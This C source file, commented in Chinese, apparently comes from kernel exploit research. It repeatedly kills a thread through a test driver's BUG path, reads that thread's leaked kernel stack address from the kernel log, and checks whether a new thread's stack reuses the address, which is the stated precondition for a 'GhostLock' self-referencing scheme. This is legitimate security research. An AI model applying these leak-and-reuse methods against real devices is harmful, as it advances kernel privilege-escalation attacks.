/*
 * kstack_oops — 模拟真实时序：线程先泄漏本线程内核栈地址，然后被 BUG 打死；
 *                紧接着新建一个线程，看它是否落到同一地址。
 *
 * 这是 GhostLock 自指方案能不能成立的核心前提：
 *   T1 触发 → dmesg 里有 T1 的栈地址 → T1 被 oops 杀掉（内核栈释放）
 *   T2 触发 → 若落在同一地址，就能用泄漏值填 node_list 自指
 *
 * 用法（uid0）：ktool root /data/local/tmp/ko <轮数>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/syscall.h>

#define SYSLOG_ACTION_READ_ALL 3
static char g_kbuf[1 << 20];

static void *bug_worker(void *arg)
{
	int fd = open("/dev/ktool", O_WRONLY);

	(void)arg;
	if (fd >= 0) {
		write(fd, "bugtest", 7);	/* 不返回：线程被 BUG 打死 */
		close(fd);
	}
	return NULL;
}

static void *warn_worker(void *arg)
{
	int fd = open("/dev/ktool", O_WRONLY);

	(void)arg;
	if (fd >= 0) {
		write(fd, "warntest", 8);
		close(fd);
	}
	return NULL;
}

/* tag 形如 "ktool bugtest: stack=" */
static unsigned long last_stack(const char *tag)
{
	long n = syscall(SYS_syslog, SYSLOG_ACTION_READ_ALL, g_kbuf,
			 sizeof(g_kbuf) - 1);
	char *p = g_kbuf, *last = NULL;
	unsigned long val = 0;
	size_t tl = strlen(tag);

	if (n <= 0)
		return 0;
	g_kbuf[n] = 0;
	while ((p = strstr(p, tag)) != NULL) {
		last = p;
		p++;
	}
	if (!last)
		return 0;
	sscanf(last + tl, "%lx", &val);
	return val;
}

int main(int argc, char **argv)
{
	int n = (argc > 1) ? atoi(argv[1]) : 4;
	int i, same = 0;

	if (n < 1 || n > 10)
		n = 4;
	printf("=== oops-death -> realloc reuse test, %d rounds ===\n", n);

	for (i = 0; i < n; i++) {
		pthread_t a, b;
		unsigned long leak = 0, next = 0;

		pthread_create(&a, NULL, bug_worker, NULL);
		pthread_detach(a);
		usleep(400000);			/* 等 BUG 落盘 + 线程收尸 */
		leak = last_stack("ktool bugtest: stack=");

		pthread_create(&b, NULL, warn_worker, NULL);
		pthread_detach(b);
		usleep(300000);
		next = last_stack("ktool warntest: stack=");

		printf("round %d: killed-thread=%08lx  new-thread=%08lx  %s\n", i,
		       leak, next, (leak && leak == next) ? "SAME" : "diff");
		if (leak && leak == next)
			same++;
		usleep(200000);
	}

	printf("=== same: %d/%d ===\n", same, n);
	printf("=== after-oops reuse: %s ===\n",
	       same ? "YES" : "NO");
	return 0;
}
